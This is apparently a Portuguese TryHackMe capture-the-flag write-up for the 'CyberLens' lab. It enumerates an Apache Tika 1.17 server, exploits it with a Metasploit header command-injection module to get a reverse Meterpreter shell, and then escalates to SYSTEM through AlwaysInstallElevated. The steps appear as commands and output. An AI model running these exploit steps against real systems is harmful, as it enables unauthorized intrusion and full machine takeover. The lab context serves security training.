> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/writeups/tryhackme/cyberlens.md).

# CyberLens

<div data-full-width="false"><figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FQfQ8xOZjt4IUVb8eW2Ow%2Fimage.png?alt=media&amp;token=d2652146-2634-4fce-b473-6150cc5c654d" alt=""><figcaption></figcaption></figure></div>

{% embed url="<https://tryhackme.com/r/room/cyberlensp6>" %}

**Classificação** : Fácil

**Criador** : [Tyler Ramsbey](https://www.youtube.com/@TylerRamsbey)

**Ferramentas** : Nmap, Metasploit

Colocar `cyberlens.thm` no arquivo `/etc/hosts`

```bash
echo '10.10.252.163 cyberlens.thm' >> /etc/hosts
```

### Enumeração

Não usei o nmap com a opção `-p-`  porque eu realmente precisava dormir, então dei uma olhada no site e no seu código fonte

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FkVU9OZMuOycx0psxqPLu%2FCaptura%20de%20ecra%CC%83%202024-05-19%2C%20a%CC%80s%2021.15.13.png?alt=media&amp;token=6b59fbca-ad92-4594-a066-f860ec602bea" alt=""><figcaption></figcaption></figure>

Mais a baixo do site, há um botão `Get Metadata`  então verifiquei o seu evento, ele me rediriciona para o seguite :&#x20;

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FsXa2hBCpFIV3JUcSZoHF%2F1.png?alt=media&amp;token=ea27fcf8-5aa1-411b-bb20-3edf19dd5e63" alt=""><figcaption></figcaption></figure>

`61777` é uma porta bastante incomun, quis saber o que há nela com o `nmap` &#x20;

```bash
$ nmap -sC -sV -p61777 -Pn cyberlens.thm
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-19 20:25 EDT
Nmap scan report for cyberlens.thm (10.10.252.163)
Host is up (0.25s latency).

PORT      STATE SERVICE VERSION
61777/tcp open  http    Jetty 8.y.z-SNAPSHOT
|_http-cors: HEAD GET
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: Jetty(8.y.z-SNAPSHOT)
|_http-title: Welcome to the Apache Tika 1.17 Server

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.05 seconds

```

Nota-se claramente que há um servidor web rodando, então a primeira coisa a fazer é procurar um CVE para esta versão do Apache Tika com o `searchsploit`

<pre class="language-bash"><code class="lang-bash"><strong>$ searchsploit Apache Tika 1.17 
</strong>------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
Apache Tika 1.15 - 1.17 - Header Command Injection (Metasploit)                            | windows/remote/47208.rb
Apache Tika-server &#x3C; 1.18 - Command Injection                                              | windows/remote/46540.py
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

</code></pre>

Iniciar o metasploit para procurarmos por um exploit

```bash
$ msfconsole -q 
msf6 > search type:exploit apache tika

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/windows/http/apache_tika_jp2_jscript  2018-04-25       excellent  Yes    Apache Tika Header Command Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/apache_tika_jp2_jscript

msf6 > use exploit/windows/http/apache_tika_jp2_jscript
```

### Obtendo acesso

Definir as opções :&#x20;

* RHOST
* LHOST
* RPORT (61777)

Em seguida iniciar a exploração com \`run ou exploit\` e obter uma sessão meterpreter

```bash
[*] Meterpreter session 1 opened (10.9.225.130:4444 -> 10.10.252.163:49945) at 2024-05-19 20:45:34 -0400

meterpreter > sysinfo 
Computer        : CYBERLENS
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > 

```

Podemos localizar a flag \`user\` na área de trabalho

```powershell
Directory of C:\Users\CyberLens\Desktop

06/06/2023  07:53 PM    <DIR>          .
06/06/2023  07:53 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
06/06/2023  07:54 PM                25 user.txt <---
               3 File(s)          1,106 bytes
               2 Dir(s)  14,947,811,328 bytes free
```

### Escalação de privilégios

A vulnerabilidade é um pouco antiga, de certeza que o metasploit já tenha indexado isso nos seus bancos de dados, executei o módulo `multi/recon/local_exploit_suggester` descobrindo três vulnerabilidades

```powershell
msf6 post(multi/recon/local_exploit_suggester) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                      Connection
  --  ----  ----                     -----------                      ----------
  1         meterpreter x86/windows  CYBERLENS\CyberLens @ CYBERLENS  10.9.225.130:4444 -> 10.10.252.163:49945 (10.10.252.1
                                                                      63)

msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.252.163 - Collecting local exploits for x86/windows...
[*] 10.10.252.163 - 193 exploit checks are being tried...

...SNIP...

 1   exploit/windows/local/always_install_elevated                  Yes                      The target is vulnerable.
 2   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.                                                                                                                         
 3   exploit/windows/local/cve_2020_1048_printerdemon               Yes                      The target appears to be vulnerable.                                                                                                                         
 4   exploit/windows/local/cve_2020_1337_printerdemon               Yes                      The target appears to be vulnerable.                                                                                                                         
 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.                
```

Começaremos pelo primeiro configurando as opções :&#x20;

* LHOST
* LPORT
* SESSION

```bash
msf6 exploit(windows/local/always_install_elevated) > set session 1
session => 1
msf6 exploit(windows/local/always_install_elevated) > set lhost 10.9.225.130
lhost => 10.9.225.130
msf6 exploit(windows/local/always_install_elevated) > set lport 4444
lport => 4444
msf6 exploit(windows/local/always_install_elevated) > run

[*] Started reverse TCP handler on 10.9.225.130:4444 
[*] Uploading the MSI to C:\Users\CYBERL~1\AppData\Local\Temp\1\bxmbsQXGgcxx.msi ...
[*] Executing MSI...
[*] Sending stage (176198 bytes) to 10.10.252.163
[+] Deleted C:\Users\CYBERL~1\AppData\Local\Temp\1\bxmbsQXGgcxx.msi
[*] Meterpreter session 2 opened (10.9.225.130:4444 -> 10.10.252.163:49950) at 2024-05-19 21:04:21 -0400

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```

Podemos encontrar a flag na área de trabalho do administrador

```powershell
Directory of C:\Users\Administrator\Desktop

06/06/2023  07:45 PM    <DIR>          .
06/06/2023  07:45 PM    <DIR>          ..
11/27/2023  07:50 PM                24 admin.txt <----
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
               3 File(s)          1,105 bytes
               2 Dir(s)  14,947,409,920 bytes free

C:\Users\Administrator\Desktop>
```
